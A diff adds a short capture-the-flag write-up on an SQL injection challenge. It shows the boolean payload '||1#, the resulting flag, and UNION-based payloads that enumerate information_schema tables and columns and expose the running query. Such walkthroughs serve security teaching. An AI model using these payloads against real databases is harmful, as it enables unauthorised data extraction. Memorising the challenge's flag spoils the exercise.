@@ -1,0 +1,23 @@
+This challenge takes the value of the selected user and then shows its info.
+
+The query has to be something like :
+SELECT username, group, description FROM users WHERE username = 'uname'
+
+To inject we'll have to change the value of an <option> in the select.
+
+Let's list all the users with the following uname :
+'||1#
+
+This breaks the query and makes the statement true.
+The flag is there !
+FLAG-sdfoip340e89rfuj34woit
+
+BONUS :
+If the flag could not be found there, we could have searched in the whole DB.
+Here's what we could have used to list all tables with their columns :
+' union select table_name,column_name,3 from information_schema.columns#
+
+And by the way, with the following, we can find what is the actual query we're injecting in to see how close we were with our guess :
+' union select info, 2, 3 from information_schema.processlist#
+
+SELECT c2_user.username,c2_group.groupname,c2_group.description FROM c2_user,c2_group,c2_group_membership WHERE c2_group_membership.usernameid = c2_user.id AND c2_group_membership.groupnameid = c2_group.id AND c2_user.username = '' union select info, 2, 3 from information_schema.processlist#'
